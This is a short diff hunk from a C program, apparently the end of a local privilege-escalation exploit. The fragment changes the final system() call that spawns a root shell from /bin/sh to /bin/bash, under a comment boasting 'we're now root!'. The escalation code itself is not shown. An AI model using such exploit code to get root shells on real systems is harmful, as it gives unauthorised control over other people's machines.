@@ -38,7 +38,7 @@ int main(int argc, char **argv)
 	/* Now just spawn a shell;
 	 * <i>Evil Laugh</i>, we're now root!
 	 */
-	system("/bin/sh");
+	system("/bin/bash");
 	exit (EXIT_SUCCESS);
 }
 
